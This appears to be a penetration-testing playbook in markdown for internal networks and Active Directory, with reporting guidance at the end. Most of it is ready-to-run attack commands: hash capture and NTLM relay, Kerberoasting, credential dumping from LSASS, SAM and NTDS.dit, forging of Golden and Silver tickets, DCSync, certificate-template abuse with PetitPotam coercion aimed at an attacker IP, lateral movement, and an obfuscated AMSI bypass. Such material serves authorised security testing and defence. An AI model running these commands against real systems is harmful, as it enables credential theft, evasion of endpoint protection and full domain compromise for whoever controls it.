# Internal Pentest & Active Directory Attacks

Techniques for internal network penetration testing and Active Directory exploitation. Use during Phase 6/7 when internal network access is achieved or when scope includes AD/Windows infrastructure.

---

## Initial Network Reconnaissance

### Host & Port Discovery

```bash
# Quick ping sweep + top ports (fast)
sudo nmap -v --top-ports 20 10.10.10.0/24 -f -n --open -oA quick_scan

# Service detection on top 200 ports
sudo nmap -v --top-ports 200 10.10.10.0/24 -f -n -sV --open -oA medium_scan

# Full port scan (no ping, all alive)
sudo nmap -v --top-ports 1000 10.10.10.0/24 -f -n -sV -Pn --open -oA full_scan

# UDP scan (slow but important)
sudo nmap -sU --top-ports 50 10.10.10.0/24 -n --open -oA udp_scan
```

### Web Service Detection

```bash
# httpx on discovered IPs
cat ips.txt | httpx -silent -random-agent -status-code -timeout 15 -title -web-server -tech-detect -o httpx.txt

# Uncommon ports
cat ips.txt | httpx -silent -ports 8080,8443,9090,3000,5000,8000,8888 -random-agent -status-code -o httpx_uncommon.txt
```

### Domain Controller Discovery

```bash
# DNS SRV records
nslookup -q=srv _ldap._tcp.dc._msdcs.domain.local
nslookup -type=srv _ldap._tcp.domain.local | grep ldap | cut -d ' ' -f 6

# LDAP base query
ldapsearch -h DC_IP -x -s base namingcontexts

# CrackMapExec SMB detection
crackmapexec smb 10.10.10.0/24
```

---

## AD Enumeration — No Credentials

### Null Session Attacks

```bash
# Test null session on LDAP
ldapsearch -h DC_IP -x -b "DC=domain,DC=local"

# Null session on SMB
smbmap -H DC_IP -u '' -p ''
smbclient -L //DC_IP -N

# RPC null session
rpcclient -U "" -N DC_IP
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> getdompwinfo
```

### ASREPRoast (No Creds Required)

```bash
# If you have a username list (from OSINT, LinkedIn, email format)
GetNPUsers.py 'DOMAIN.LOCAL/' -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip DC_IP

# Crack with hashcat (mode 18200)
hashcat -m 18200 -a 0 asrep_hashes.txt /path/to/wordlist.txt
```

### LLMNR/NBT-NS Poisoning (Responder)

```bash
# Listen mode first (passive recon)
responder -I eth0 -A

# Active poisoning (captures NTLMv2 hashes)
responder -I eth0 -rv

# Crack captured hashes (NTLMv2 = hashcat mode 5600)
hashcat -m 5600 responder_hashes.txt /path/to/wordlist.txt

# Relay instead of crack (if SMB signing disabled)
# First: set SMB and HTTP to Off in /usr/share/responder/Responder.conf
ntlmrelayx.py -tf targets.txt -smb2support
# Or for specific target:
ntlmrelayx.py -t smb://TARGET_IP -smb2support -c "whoami"
```

---

## AD Enumeration — With Credentials

### LDAP Enumeration

```bash
# Domain users (full details)
ldapsearch -LLL -x -H ldap://DC_IP -D "USER@DOMAIN.LOCAL" -w 'PASSWORD'   -b "DC=domain,DC=local" -o ldif-wrap=no   "(&(objectClass=user)(objectCategory=person))"   name sAMAccountName userPrincipalName memberOf adminCount   userAccountControl servicePrincipalName pwdLastSet lastLogon   | tee domain_users.txt

# Domain computers
ldapsearch -LLL -x -H ldap://DC_IP -D "USER@DOMAIN.LOCAL" -w 'PASSWORD'   -b "DC=domain,DC=local" -o ldif-wrap=no   "(objectClass=computer)"   name dNSHostname operatingSystem operatingSystemVersion   | tee domain_computers.txt

# Domain groups + members
ldapsearch -LLL -x -H ldap://DC_IP -D "USER@DOMAIN.LOCAL" -w 'PASSWORD'   -b "DC=domain,DC=local" -o ldif-wrap=no   "(objectClass=group)" name sAMAccountName member description   | tee domain_groups.txt
```

### CrackMapExec (Swiss Army Knife)

```bash
# Execute commands
crackmapexec smb TARGET -u USER -p 'PASS' -x "whoami"          # CMD
crackmapexec smb TARGET -u USER -p 'PASS' -X "Get-Host"        # PowerShell
crackmapexec smb TARGET -u USER -H NTHASH -x "whoami"          # Pass-the-Hash

# Credential dumps
crackmapexec smb TARGET -d DOMAIN -u USER -p 'PASS' --sam      # SAM hashes
crackmapexec smb TARGET -d DOMAIN -u USER -p 'PASS' --lsa      # LSA secrets
crackmapexec smb TARGET -d DOMAIN -u USER -p 'PASS' --ntds     # NTDS.dit (DC only)

# Enumeration
crackmapexec smb TARGET -d DOMAIN -u USER -p 'PASS' --users
crackmapexec smb TARGET -d DOMAIN -u USER -p 'PASS' --groups
crackmapexec smb TARGET -d DOMAIN -u USER -p 'PASS' --shares
crackmapexec smb TARGET -d DOMAIN -u USER -p 'PASS' --sessions
crackmapexec smb TARGET -d DOMAIN -u USER -p 'PASS' --loggedon-users
crackmapexec smb TARGET -d DOMAIN -u USER -p 'PASS' --pass-pol

# Password spray (careful with lockout!)
crackmapexec smb DC_IP -u users.txt -p 'Spring2024!' --no-bruteforce
```

### BloodHound Collection

```bash
# SharpHound (from Windows)
.\SharpHound.exe -c All -d DOMAIN.LOCAL

# BloodHound.py (from Linux, remote)
bloodhound-python -u USER -p 'PASS' -d DOMAIN.LOCAL -ns DC_IP -c All

# Import into BloodHound GUI and query:
# - Shortest path to Domain Admin
# - Kerberoastable users with path to DA
# - Users with DCSync rights
# - Computers with unconstrained delegation
```

### windapsearch

```bash
# https://github.com/ropnop/go-windapsearch
windapsearch -d DOMAIN.LOCAL -u USER -p 'PASS' --da          # Domain Admins
windapsearch -d DOMAIN.LOCAL -u USER -p 'PASS' --privileged  # Privileged users
windapsearch -d DOMAIN.LOCAL -u USER -p 'PASS' --unconstrained  # Unconstrained delegation
```

---

## Kerberos Attacks

### Kerberoasting (hashcat 13100)

```bash
# Linux (Impacket)
GetUserSPNs.py -request -save -dc-ip DC_IP DOMAIN/USER:'PASS' -outputfile kerberoast.txt

# Windows (Rubeus)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Crack
hashcat -m 13100 --force kerberoast.txt /path/to/wordlist.txt
```

### ASREPRoast (hashcat 18200)

```bash
# With creds (enumerate all vulnerable users)
GetNPUsers.py DOMAIN/USER:'PASS' -request -format hashcat -outputfile asrep.txt -dc-ip DC_IP

# Without creds (need username list)
GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip DC_IP

# Crack
hashcat -m 18200 -a 0 asrep.txt /path/to/wordlist.txt
```

### Pass-the-Hash (PTH)

```bash
# Impacket tools with NTLM hash
psexec.py -hashes ':NTHASH' DOMAIN/USER@TARGET
smbexec.py -hashes ':NTHASH' DOMAIN/USER@TARGET
wmiexec.py -hashes ':NTHASH' DOMAIN/USER@TARGET

# CrackMapExec
crackmapexec smb TARGET -u USER -H NTHASH -x "whoami"
```

### Overpass-the-Hash / Pass-the-Key

```bash
# Get TGT with NTLM hash (Linux)
getTGT.py DOMAIN/USER -hashes :NTHASH
export KRB5CCNAME=USER.ccache

# Get TGT with AES key (stealthier)
getTGT.py DOMAIN/USER -aesKey AES256_KEY
export KRB5CCNAME=USER.ccache

# Use TGT for remote execution
psexec.py DOMAIN/USER@TARGET -k -no-pass
wmiexec.py DOMAIN/USER@TARGET -k -no-pass

# Windows (Rubeus)
.\Rubeus.exe asktgt /domain:DOMAIN /user:USER /rc4:NTHASH /ptt
.\PsExec.exe -accepteula \\TARGET cmd
```

### Silver Ticket

```bash
# Forge TGS for specific service (need service account NTLM hash + domain SID)
ticketer.py -nthash SERVICE_NTLM -domain-sid S-1-5-21-xxx -domain DOMAIN -spn CIFS/target.domain.local USERNAME
export KRB5CCNAME=USERNAME.ccache
psexec.py DOMAIN/USERNAME@target.domain.local -k -no-pass

# Windows (Mimikatz)
mimikatz # kerberos::golden /domain:DOMAIN /sid:S-1-5-21-xxx /rc4:SERVICE_NTLM /user:USERNAME /service:cifs /target:target.domain.local
mimikatz # kerberos::ptt ticket.kirbi
```

### Golden Ticket

```bash
# Need krbtgt NTLM hash + domain SID (requires DCSync or NTDS.dit)
# Linux
ticketer.py -nthash KRBTGT_NTLM -domain-sid S-1-5-21-xxx -domain DOMAIN USERNAME
export KRB5CCNAME=USERNAME.ccache
psexec.py DOMAIN/USERNAME@DC -k -no-pass

# Windows (Mimikatz)
mimikatz # kerberos::golden /domain:DOMAIN /sid:S-1-5-21-xxx /rc4:KRBTGT_NTLM /user:Administrator
mimikatz # kerberos::ptt ticket.kirbi
```

### DCSync

```bash
# Dump all hashes from DC (need Replicating Directory Changes rights)
secretsdump.py DOMAIN/USER:'PASS'@DC_IP

# Dump specific user (krbtgt for Golden Ticket)
secretsdump.py DOMAIN/USER:'PASS'@DC_IP -just-dc-user krbtgt
secretsdump.py DOMAIN/USER:'PASS'@DC_IP -just-dc-user Administrator
```

### Delegation Attacks

```text
Unconstrained Delegation:
- Computer stores user's TGT for any service
- If you compromise that computer → steal any user's TGT
- Find: Get-ADComputer -Filter {TrustedForDelegation -eq $true}
- Attack: Wait for admin to connect, extract TGT from memory

Constrained Delegation (S4U2Proxy):
- Service can impersonate users to specific services only
- Find: Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"}
- Attack: getST.py -spn TARGET_SPN -impersonate Administrator DOMAIN/SERVICE_USER:'PASS'

Resource-Based Constrained Delegation (RBCD):
- If you can write msDS-AllowedToActOnBehalfOfOtherIdentity
- Create computer account → set RBCD → impersonate admin
- https://github.com/tothi/rbcd-attack
```

---

## Credential Dumping

### From Memory (LSASS)

```bash
# Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords    # All credentials
mimikatz # sekurlsa::tickets /export   # Kerberos tickets

# Remote via CrackMapExec
crackmapexec smb TARGET -u USER -p 'PASS' -M lsassy
crackmapexec smb TARGET -u USER -p 'PASS' --lsa
```

### From SAM/SYSTEM

```bash
# Local (need admin)
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
secretsdump.py -sam sam.save -system system.save LOCAL

# Remote
secretsdump.py DOMAIN/USER:'PASS'@TARGET
```

### From NTDS.dit (Domain Controller)

```bash
# Remote DCSync (preferred — no file copy needed)
secretsdump.py DOMAIN/USER:'PASS'@DC_IP -just-dc

# Volume Shadow Copy (if DCSync not possible)
# On DC:
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.save
# Then extract:
secretsdump.py -ntds ntds.dit -system system.save LOCAL
```

### GPP Passwords (Group Policy Preferences)

```bash
# Find cpassword in SYSVOL
findstr /S cpassword \\DC\sysvol\*.xml

# Decrypt (known static key)
gpp-decrypt ENCRYPTED_CPASSWORD

# CrackMapExec module
crackmapexec smb DC_IP -u USER -p 'PASS' -M gpp_password
```

---

## AD Certificate Services (ADCS) Attacks

### Enumeration

```bash
# Certipy — find vulnerable templates and CAs
certipy find -u USER@DOMAIN -p 'PASS' -dc-ip DC_IP -vulnerable -stdout
certipy find -u USER@DOMAIN -p 'PASS' -dc-ip DC_IP -json -output adcs.json

# Certify.exe (Windows)
.\Certify.exe find /vulnerable
.\Certify.exe cas
```

### ESC1 — Misconfigured Template (Client Auth + Supply Subject)

```bash
# Template allows enrollee to specify SAN (Subject Alternative Name)
# → request cert as Domain Admin
certipy req -u USER@DOMAIN -p 'PASS' -ca 'CA-NAME' -template 'VULN-TEMPLATE' \
  -upn 'administrator@domain.local' -dc-ip DC_IP

# Authenticate with forged cert
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# → outputs NT hash for administrator
```

### ESC4 — Template ACL Abuse

```bash
# If you have write access to a template → make it vulnerable (ESC1)
certipy template -u USER@DOMAIN -p 'PASS' -template 'TARGET-TEMPLATE' \
  -save-old -dc-ip DC_IP
# Now request as ESC1
certipy req -u USER@DOMAIN -p 'PASS' -ca 'CA-NAME' -template 'TARGET-TEMPLATE' \
  -upn 'administrator@domain.local' -dc-ip DC_IP
# Restore original
certipy template -u USER@DOMAIN -p 'PASS' -template 'TARGET-TEMPLATE' \
  -configuration old_config.json -dc-ip DC_IP
```

### ESC8 — NTLM Relay to ADCS HTTP Enrollment

```bash
# If CA has HTTP enrollment enabled (http://CA/certsrv/)
# Relay NTLM auth (from Responder/PetitPotam) to CA web enrollment
ntlmrelayx.py -t http://CA-IP/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# Coerce DC auth via PetitPotam
python3 PetitPotam.py ATTACKER_IP DC_IP

# Authenticate with captured cert
certipy auth -pfx dc.pfx -dc-ip DC_IP
```

### ESC11 — NTLM Relay to ICPR (RPC)

```bash
# If CA RPC interface lacks encryption flag
certipy relay -ca CA_IP -template DomainController
# Coerce with PetitPotam/PrinterBug, get DC cert → DCSync
```

### Key Finding Severities

| ESC | Impact | Severity |
|-----|--------|----------|
| ESC1 | Any user → Domain Admin | Critical |
| ESC4 | Template write → Domain Admin | Critical |
| ESC8 | Network position → Domain Admin (via coercion) | High-Critical |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | Critical |
| ESC7 | CA manager approval bypass | High |

---

## Windows Privilege Escalation

### Token Impersonation

| Technique | Requirement | Windows Version |
|-----------|-------------|-----------------|
| JuicyPotato | SeImpersonate or SeAssignPrimaryToken | ≤ Server 2016, ≤ Win10 1803 |
| PrintSpoofer | SeImpersonate | Server 2019, Win10 |
| RoguePotato | SeImpersonate | Server 2019, Win10 |
| GodPotato | SeImpersonate | All versions (2024) |

```bash
# PrintSpoofer
.\PrintSpoofer.exe -i -c "cmd /c whoami"

# GodPotato (latest, works everywhere)
.\GodPotato.exe -cmd "cmd /c whoami"
```

### Common CVEs

| CVE | Name | Impact |
|-----|------|--------|
| CVE-2020-1472 | ZeroLogon | Reset DC machine account password → DCSync |
| CVE-2021-36934 | HiveNightmare/SeriousSAM | Read SAM/SYSTEM as non-admin |
| CVE-2021-34527 | PrintNightmare | RCE via Print Spooler |
| MS17-010 | EternalBlue | Remote code execution via SMB |
| CVE-2022-26923 | Certifried | AD CS domain privesc |

---

## Lateral Movement

### Remote Execution Methods

| Method | Port | Stealth | Notes |
|--------|------|---------|-------|
| PsExec | 445 | Low | Creates service, writes to disk |
| WMIExec | 135 | Medium | No disk write, uses WMI |
| SMBExec | 445 | Medium | Uses service but less artifacts |
| WinRM | 5985/5986 | Medium | PowerShell remoting |
| DCOM | 135 | High | Uses COM objects |
| RDP | 3389 | Low | Interactive, logged |
| SSH | 22 | Medium | If OpenSSH installed |

```bash
# Impacket suite
psexec.py DOMAIN/USER:'PASS'@TARGET
wmiexec.py DOMAIN/USER:'PASS'@TARGET
smbexec.py DOMAIN/USER:'PASS'@TARGET
dcomexec.py DOMAIN/USER:'PASS'@TARGET

# Evil-WinRM (PowerShell remoting)
evil-winrm -i TARGET -u USER -p 'PASS'
evil-winrm -i TARGET -u USER -H NTHASH
```

### SMB Shares for Lateral Movement

```bash
# Find writable shares
smbmap -H TARGET -u USER -p 'PASS'
crackmapexec smb TARGETS -u USER -p 'PASS' --shares

# Mount and explore
smbclient //TARGET/SHARE -U 'DOMAIN/USER%PASS'
mount -t cifs //TARGET/SHARE /mnt -o username=USER,password=PASS,domain=DOMAIN
```

---

## AMSI Bypass (for PowerShell payloads)

```powershell
# Basic (often detected)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Obfuscated variant
sET-ItEM ('V'+'aR'+'IA'+'blE:1q2'+'uZx') ([TYpE]("{1}{0}"-F'F','rE'));(GeT-VariaBle("1Q2U"+"zX")-VaL)."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}"-f'Util','A','Amsi','.Management.','utomation.','s','System'))."g`etf`iElD"(("{0}{2}{1}"-f'amsi','d','InitFaile'),("{2}{4}{0}{1}{3}"-f'Stat','i','NonPubli','c','c,'))."sE`T`VaLUE"(${n`ULl},${t`RuE})
```

---

## Tools Summary

| Tool | Purpose |
|------|---------|
| [Impacket](https://github.com/fortra/impacket) | Python AD attack suite (psexec, secretsdump, GetUserSPNs, etc.) |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) | Swiss army knife for AD (enum, spray, exec, dump) |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound) | AD attack path visualization |
| [Rubeus](https://github.com/GhostPack/Rubeus) | Kerberos abuse (Windows) |
| [Mimikatz](https://github.com/gentilkiwi/mimikatz) | Credential extraction (Windows) |
| [Responder](https://github.com/lgandx/Responder) | LLMNR/NBT-NS/mDNS poisoning |
| [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) | WinRM shell |
| [Kerbrute](https://github.com/ropnop/kerbrute) | Kerberos brute-force/user enum |
| [windapsearch](https://github.com/ropnop/go-windapsearch) | LDAP enumeration |
| [ntlmrelayx](https://github.com/fortra/impacket) | NTLM relay attacks |
| [Certipy](https://github.com/ly4k/Certipy) | AD Certificate Services attacks |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit) | AD enumeration (PowerShell) |

---

## Attack Flow Decision Tree

```text
Internal Network Access Gained
│
├── No credentials
│   ├── Responder (LLMNR/NBT-NS poisoning) → capture NTLMv2 → crack
│   ├── ASREPRoast (if username list available) → crack
│   ├── Null session LDAP/SMB → enumerate users
│   ├── SMB signing disabled? → NTLM relay → code execution
│   └── Network sniffing → credentials in cleartext?
│
├── Got domain user credentials
│   ├── BloodHound collection → find attack paths
│   ├── Kerberoasting → crack service account passwords
│   ├── Password spray (carefully!) → more accounts
│   ├── Share enumeration → sensitive files, scripts with creds
│   ├── GPP passwords in SYSVOL
│   └── LDAP enum → find privileged users, delegation, SPNs
│
├── Got local admin on a machine
│   ├── LSASS dump → plaintext/NTLM creds of logged-in users
│   ├── SAM dump → local account hashes
│   ├── Pass-the-Hash → lateral movement
│   ├── Token impersonation → SYSTEM
│   └── Check for domain admin sessions → steal TGT
│
├── Got domain admin
│   ├── DCSync → dump all domain hashes
│   ├── Golden Ticket → persistent access
│   ├── NTDS.dit extraction → offline cracking
│   └── Document scope of compromise
│
└── Document everything
    ├── Attack path diagram (BloodHound export)
    ├── Credentials inventory
    ├── Systems compromised
    └── Data accessed
```

---

## Reporting Guidance

**Severity for internal/AD findings:**
- Domain Admin compromise → **Critical**
- DCSync / NTDS.dit access → **Critical**
- Kerberoastable user with DA path → **High**
- LLMNR/NBT-NS poisoning possible → **Medium** (requires network position)
- SMB signing disabled → **Medium** (enables relay)
- Weak password policy (cracked in < 1 hour) → **Medium**
- Null session information disclosure → **Low-Medium**
- Missing LAPS → **Medium** (shared local admin passwords)

**Key principle:** In AD environments, a single weak link (one kerberoastable service account with a weak password) can lead to full domain compromise. Document the complete attack chain from initial access to Domain Admin, showing each step and the time required.

---

## References

- [WADcoms](https://wadcoms.github.io) — Interactive AD attack cheatsheet
- [adsecurity.org](https://adsecurity.org/) — Sean Metcalf's AD security research
- [The Hacker Recipes](https://www.thehacker.recipes/) — Comprehensive AD attack guide
- [Attacking AD](https://zer1t0.gitlab.io/posts/attacking_ad/) — zer1t0's detailed writeup
- [AD Exploitation Cheatsheet](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet)
- [Kerberos Cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
